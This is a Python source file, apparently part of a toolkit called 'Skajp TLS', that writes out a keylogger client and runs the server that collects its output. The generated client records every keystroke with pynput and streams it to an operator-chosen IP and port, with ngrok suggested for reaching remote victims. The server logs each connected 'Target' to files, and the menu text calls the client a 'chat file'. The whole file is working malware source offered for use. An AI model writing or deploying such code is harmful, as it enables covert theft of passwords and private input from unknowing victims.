#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#              This script was made for Skajp TLS
#              -~==============================~-
# Made by Skajp

def Keylogger():
    import socket, json, os, datetime
    def MakeClient(conip, conport):
        data = f"""

# Made by Skajp
from pynput.keyboard import Key, Listener
import logging, socket, json

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
notcon = True
while notcon:
    try:
        s.connect((str('{conip}'), int({conport})))
        notcon = False
        break
    except:
        pass

def rs(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def on_press(key):
    rs(str(key))

with Listener(on_press=on_press) as listener :
    listener.join()
        """
        if os.path.exists(f"./misc/keylogger/clients/{filename}.py"):
            with open(f"./misc/keylogger/clients/{filename}.py", "w") as f:
                f.write(data)
                print(f"\033[1;90m Chat file created in './misc/keylogger/clients/{filename}.py'")
        else:
            lolec = open(f"./misc/keylogger/clients/{filename}.py", "x")
            with open(f"./misc/keylogger/clients/{filename}.py", "w") as f:
                f.write(data)
                print(f"\033[1;90m Chat file created in './misc/keylogger/clients/{filename}.py'")
        
    def Server(host, port):
        if not os.path.exists("./misc/keylogger/logs"):
            os.makedirs('misc/logs')

        def reliable_recv():
            data = ''
            while True:
                try:
                    data = data + target.recv(1024).decode().rstrip()
                    return json.loads(data)
                except ValueError:
                    continue

        def target_communication():
            timen = datetime.datetime.now().strftime('%Hh %Mm %Ss')
            while True:
                result = reliable_recv()
                print(result)
                with open(f"./misc/keylogger/logs/log-{ip[0]}[{timen}].txt", "a") as f:
                    f.write(f"{result}\n")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((str(host), int(port)))
        server.listen()

        target, ip = server.accept()
        print(f" [+] Target Connected: {str(ip)} " )
        print(" [!] Keylogger started...\n")
        target_communication()

    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    clear()

    def Menu():
        global ip, port
        print("\n\033[1;90m For local chat input your private ip")
        print("\033[1;90m For online chat use ngrok")

        print(f"\n\033[1;90m This will start server and create client to './misc/keylogger/clients/'")
        print(f"\033[1;90m And save logs into './misc/keylogger/logs/'")

        ip = input("\n\033[1;93m IP\033[1;90m > \033[1;37m")
        port = input("\033[1;93m PORT\033[1;90m > \033[1;37m")

    Menu()
    clear()
    print(f"Listening on {ip} and port {port}...")
    if ip == '0.0.0.0':
        print("\n\033[1;90m Are you trying to connect via ngrok?")
        cho = input("\n\033[1;93m Y/N \033[1;90m > \033[1;37m").lower()
        cho = cho.split()[0]
        if cho in ['n', 'nn', 'nah', 'no']:
            conhost = '127.0.0.1'
            conport = port
        else:
            conhost = input("\n\033[1;93m NGROK IP \033[1;90m> \033[1;37m")
            conport = input("\033[1;93m NGROK PORT \033[1;90m> \033[1;37m")
        filename = input("\n\033[1;93m Filename of client \033[1;90m> \033[1;37m")
        if len(filename) < 1:
            filename = 'client'
    MakeClient(conhost, conport)
    print("\n\n\033[1;90m To close server, close skajp tls and open it again")
    Server(ip, port)
